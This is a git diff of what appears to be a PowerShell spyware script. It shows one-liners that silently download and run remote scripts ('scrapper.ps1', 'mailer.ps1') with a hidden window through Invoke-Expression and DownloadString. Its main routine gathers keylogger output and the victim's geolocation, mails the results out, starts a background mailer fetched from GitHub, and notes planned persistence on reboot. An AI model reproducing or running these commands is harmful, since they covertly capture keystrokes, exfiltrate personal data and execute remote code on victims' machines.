@@ -19,8 +19,7 @@ FIRST RUN "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser"
 ########## OR #############
 USE 
 Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')
-########## OR #############
-### This line does not work
+########## DEBUG #############
 powershell -windowstyle hidden -nologo -command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/scrapper.ps1')"
 powershell -windowstyle hidden -nologo -command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/axano/powershellScripts/master/mailer.ps1')"
 
@@ -48,7 +47,11 @@ $results = nonAdministrativeScrapperFunctions
 $results += keyLogger
 $results += findGeoLocation
 mail $results
+### Creates background function to mail keylogger results. Retrieves script from github
 createNewMailer
+### Register a startup function that restarts the scrapper on reboot (TODO)
+#registerStartupFunctions
+### OLD BUGGY FUNCTION THAT DOES NOT WORK
 #createMailerToMailKeyloggerResults
 }
 
